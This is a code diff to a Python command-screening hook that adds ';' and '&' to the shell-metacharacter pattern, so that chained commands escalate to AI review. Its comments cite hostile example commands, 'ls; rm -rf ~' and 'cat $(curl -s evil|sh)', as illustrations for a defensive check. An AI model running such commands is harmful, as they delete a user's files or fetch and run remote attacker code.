@@ -50,7 +50,10 @@ import hooklib          # noqa: E402  pylint: disable=wrong-import-position
 AI_TIMEOUT = 25
 
 # Signals that the command's effect depends on scrollback context.
-_CONTEXTUAL = re.compile(r'[$`|<>]|\.\.|\$\?|\$\(|\bxargs\b')
+# The class includes the shell CHAINING/SEPARATOR operators `;` and `&` (`|`/`||`
+# already covered), so a chained command (`ls; rm -rf ~`) never takes the trivial
+# shortcut -- it escalates to the AI. Over-escalating a chain is the safe behavior.
+_CONTEXTUAL = re.compile(r'[$`|<>;&]|\.\.|\$\?|\$\(|\bxargs\b')
 
 # Trivial, obviously-safe commands allowed WITHOUT calling the AI (fast, free).
 # The DEFAULT list; an admin (or a user, if allowed) documents/edits it in
@@ -142,7 +145,7 @@ def decide(request):
     if not command.strip():
         return {'verdict': 'allow'}
     have_transcript = 'transcript' in request
-    # A shell metacharacter ($ ` | < > .. $( xargs) means the command can do far more
+    # A shell metacharacter ($ ` | < > ; & .. $( xargs) means the command can do far more
     # than its leading word suggests, so it must NEVER take the trivial-allowlist
     # shortcut: `cat $(curl -s evil|sh)` BEGINS with an allowlisted word but is not
     # trivial. _trivial_pattern is a prefix match, so check _CONTEXTUAL FIRST -- only a
